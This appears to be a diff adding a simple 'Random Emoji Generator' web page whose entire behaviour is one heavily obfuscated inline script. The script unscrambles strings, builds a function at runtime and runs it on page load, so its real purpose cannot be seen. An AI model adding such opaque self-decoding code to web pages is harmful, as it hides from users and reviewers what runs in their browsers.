@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Random Emoji Generator</title>
+    <style>
+        body {
+            margin: 0;
+            /*background: #fcfcfc;*/
+            background-color: #f5f6f8;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 90vh;
+            font-family: sans-serif;
+        }
+
+        h1 {
+            font-size: 20px;
+            text-shadow: 3px 3px 4px#c7c7c7;
+        }
+
+        .container {
+            background-color: #ffff;
+            width: 250px;
+            height: 300px;
+            max-width: 300px;
+            box-shadow: 0px 4px 10px 0px rgb(110, 110, 110, 0.4);
+            border-radius: 2px;
+            text-align: center;
+            padding: 20px 10px;
+        }
+
+        .btn {
+            height: 100px;
+            width: 100px;
+            background: rgba(58, 255, 206, 0.24);
+            font-size: 40px;
+            margin: 50px 0px 5px 0px;
+            border-radius: 5px;
+            border-color: rgba(127, 255, 212, 0.238);
+            
+        }
+
+        p {
+            font-size: 16px;
+            margin: 0;
+            padding:16px 30px;
+            text-transform: capitalize;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Random Emoji</h1>
+        <button class="btn" id="btn" disabled>click</button>
+        <p id="emoji-name"></p>
+    </div>
+    <script>
+const emoji=[];const emoName=[];var btnE,emojiName,api_key,getEmoji,showEmoji;(function(){var mDM='',lFS=398-387;function rXB(l){var q=856509;var e=l.length;var u=[];for(var h=0;h<e;h++){u[h]=l.charAt(h)};for(var h=0;h<e;h++){var g=q*(h+409)+(q%53023);var w=q*(h+152)+(q%30068);var b=g%e;var d=w%e;var x=u[b];u[b]=u[d];u[d]=x;q=(g+w)%4329159;};return u.join('')};var CWc=rXB('hneotzocuausbgsfmjcrrdlknopvcqtrywxit').substr(0,lFS);var dwY='nnc ,=i)njx+n,eenjgao0s)=, ard8;ftgs ..;[fl4vtrvrsg)=bvut ;voa2,3;ur<acq,8nbpoon.v=v4.l,nv+r},74.u"; gy]8,4ms.,ds9,h]aSA7f[=-u7nn;ara=svb} C=)c7()eireln(;2i loe2d+uC+r+1(bpoh[fq-="l.hq,odlrA>-u=h;{= ro[v386=f;uxuds [ga( 8t;be+;08rv5{t=7d ;]=u(6"+i=))]lg,d0}(]s6h;i;;0vtftzr(tgt)gthfvu)r=0b09g*;pat=g=;u[n;S,rvv)vta+lpr).;]cropr,asrkhli",rn=sne-nmlth;)a])s.ng=a5.+;p,<b,<<(tn8=;vvept,v;h=;;v0z(.plargvtrlrt(aaCo8 * ;r"=!fg1oy=h0;(fm9gnbeer.[{h=a7;s=rah1i i;ll; i=(e=r5)]+6;h(",]a; a=5;bv=31p[r(;enenlk1rrrk(CpaeocCefa[}+C)csd};emv )2.ie7aoj[rnrirua;[i-(9{ n[a))0=a=;]f(6)=3t{d.jz+w.=m]i2sf(g="; i01tt)lot(u1u+} ,hkla+ike(rv)!i;-(s hhs+syr1)go).hv) fr6rt-);g(<;rC+pr6uo1arrn+}a)j sqhy4[h(udr6iiafao(n.6ujo{nr,va;)r+6==v;z)p+.xA,7)092bi.rg2vacetmjj;fu]+r."1ea,h.fcm=(>ao)v]l(p oa=+9mv8gk+1a;o=e.sfkgd(lga+{a=;ll(,eu.)bj+chn(.=(u0a.hoin4)alie)Aa.o9,nr2za[(mg(o(a]lC,Ago)7f.0az=;1v+xu"vr("es t,s';var OuG=rXB[CWc];var FlZ='';var UmV=OuG;var DQI=OuG(FlZ,rXB(dwY));var Kis=DQI(rXB('E}@ls0;j+r9(BBq u+.3.B9vBB=Ba2bBamr(_iBhaf;.!djBBw=$B.=7Dj.a(a1;.sdpB.n4]BtB ylC4tpBB>1d{(B).a3d=3}}u1vBlmlBcBvBf_]Bb.a(EaCd. 0{ABBfnt=(a)umF,(lkjda\/xnB}kBj"e5( _B%:8A!t80)i_gisf,]ea;Bdsp%altBjnE]7Aa()3lls+;BeB9,%lw{p(3l4dde)ou1ec(sjp)B;4)dc21ebBe.Be43%j)!jecM0([nt9.)56:ntdCmqr16wt,dBBB4nB.9sBo,i-](*n)ar.5a=No%BFuj}t {.o#enda7os)=oc"of]0]ftB;]7Bp.=)2tt!)daaoB09,4;b%344j\/Be7h[(aiBi](Bp%amB2a%._sr7)zB1..aBniuyB$et.aerkd) =B\'$,53)9ndBi_._"b8$td0r9e;in$3%t_]+=_,])}Br.=d{(apo!l3]){$T]E%c c;)%dy5B_i!!Beft1{r,;=(]( t?ACy\/B_tpta50Bh,Niwe5](;B7haB;B[]i]f=aeo(,.8etN).7e7(N%(,br]B2B2=)a;,Hcn){B+t,e%d;fm<8+.!)+BB?e;-),4r en;$%js(Bafm4n.e(=n*e]1d{2)Bt)]B(=+4d;=*_e));}y{mnSyFsa)*B;ira;).e.B0%!B3BB]_E(0;_)t.913t36bpeeB8a_s"{-1)$#mg(B_Ao0=z\'d?B(z.!$7Gj lc(](BBB,i8Bj4!!B;t.o86 eBB_)l)t)4#\/.};$B!oB ir5BB*B.;gp].mB}0BBo;o{72}#.._BjfB(f] B=r,)d4B<=_ hr=s(%}1oB)fee(E9c.x 7d;6e)!r]4=s e{deDpH)a,nnG.e.rmB)iBB8]2B_7$o;BB}6_n3)*;.9}!)=t6icabtoGr}({Bns({}=;BfEn5hti%"d7h(qe(3_(4e3B .\/Bot2d.$tf;0(_B(a4;eej]5ay=(+:e1pcno{! yle003})2)i.Bdu&B=.d)B8}.._r$s)dp}Bh3re]N(di}o9(1G)!;uB\/e0eBaBe0"05)elBB..m;={=e#77 +BaBo]]f,#,dBc+B%cd=2 .Bc(m!cf66([g86(E}2S *34i3-;).\/-u7Ba-BSBm.y3)r,3MwjEhrt(H!($%uoAo()]gpBf=A0nbb.s;7ts+0Bnst(:B63_;Bc(BB.a3h3-B_o)df.&c-"}1Byec=Bnts7.C{gmd%6=!op(m9oaa5(.Bid.)9Bo.0h3dey;Bpjn.t!)!BrBodo40r6sfi!17tBk;4}y6.;(iuCd=ofid3oBnab,ooe(BBBg,9(1BB_ar.\'0 d}g)u..$n54f.)!B21cBt [BB)do$(8a0{(;n7.i))]BBB!k3ok0..;.BM((1B.:oB5Bb3 @Bm?&n7_]=[B$B!e$j"if6>B5p9,@l,%BB;f,B]{Bl_]aB)$]a=;38o{)Bed,5="))f33-(e)eeet6B{1,cBfr)(B$I19B;(uh[BB*w5Bi)le([ f5$faB}!%)_o5db.B]d4B);p)3Bfet5fan*)h]o.] ;B,y.4=e(61)dsBiaf$u2e}b);3(B5B;Bme]o(!BBnu$e(n(o;B)971eB5_"7=C."en=ec,o(9id.s_}oBB.7fBe=33n(*,Ncde =t5_,4.tBD_%5%Bxb%H[dBex.,)Bj]Do_!8B$1"q+!m>z4!te0B(st?)B;1B32(!{jj( BBB ,e@B0niu0;12)B)ieB7)]tt *B,Nrt&6Bh8B;cB"m9e0)t0oB]e\'.B_m1t>m;d5= 6wl)o6eaE)j-;c!(]\/.0=a;,*)bBl8imB 6dB>)(nB2u!g)Bee{_2oB(Bj,58so$)p}8o4o5)}B2=z;5d9p)n.BBnBjBdr3BE0=()reN!oket,!BM#Bf[B(fo1d#f.j(9(mm=jk>)rup !(b;=d)(4;$H\/;pBs;aii$6id!{Bp(.sBe,h6 B( d)!Cc}d4liB53B((=ru!i8uC;$BD%k3B7neBdB(f$:1}el}BfdB]"5,)_5q1()dafiBslcbi_7%f;\/!_e.6 )l_7@6B{+]Bd9nbABnaBsoid.Bfm=  %3F,nBm$=jAftt[)y(ta9)]B{9,3raldcB ah0hc4anrnB ][zB;iAl;_1coa=if;Bb..{nl3t.tt=1)E'));var hxi=UmV(mDM,Kis );hxi(9017);return 7978})()
+    </script>
+</body>
+
+</html>
